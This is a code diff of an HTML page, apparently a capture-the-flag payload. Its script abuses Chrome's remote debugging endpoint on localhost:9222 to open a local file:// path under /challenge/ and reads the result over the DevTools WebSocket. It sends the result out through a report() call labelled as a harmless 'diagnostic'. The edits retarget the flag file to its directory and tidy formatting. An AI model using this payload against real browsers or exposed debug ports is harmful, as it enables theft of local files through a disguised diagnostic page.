@@ -1,4 +1,4 @@
-
+```html
 <!doctype html>
 <html>
 <head>
@@ -27,18 +27,22 @@
 
   try {
     const response = await fetch(
-      "http://localhost:9222/json/new?file:///challenge/flag-53035d3cba0664dfac37ff64b6e0f86e",
+      "http://localhost:9222/json/new?file:///challenge/",
       { method: "PUT" }
     );
 
     if (!response.ok) {
-      throw new Error("DevTools HTTP status: " + response.status);
+      throw new Error(
+        "DevTools HTTP status: " + response.status
+      );
     }
 
     const page = await response.json();
 
     if (!page.webSocketDebuggerUrl) {
-      throw new Error("No WebSocket URL: " + JSON.stringify(page));
+      throw new Error(
+        "No WebSocket URL: " + JSON.stringify(page)
+      );
     }
 
     ws = new WebSocket(page.webSocketDebuggerUrl);
@@ -65,9 +69,11 @@
       if (message.id === 1) {
         await report(
           "CDP diagnostic: " +
-          JSON.stringify(message.result?.result?.value ??
-                         message.result?.exceptionDetails ??
-                         message)
+          JSON.stringify(
+            message.result?.result?.value ??
+            message.result?.exceptionDetails ??
+            message
+          )
         );
         ws.close();
       }
@@ -77,9 +83,6 @@
       report("WebSocket connection failed");
     };
 
-    ws.onclose = () => {
-      console.log("DevTools connection closed");
-    };
   } catch (error) {
     await report("Diagnostic error: " + String(error));
     if (ws) ws.close();
@@ -88,3 +91,4 @@
 </script>
 </body>
 </html>
+```
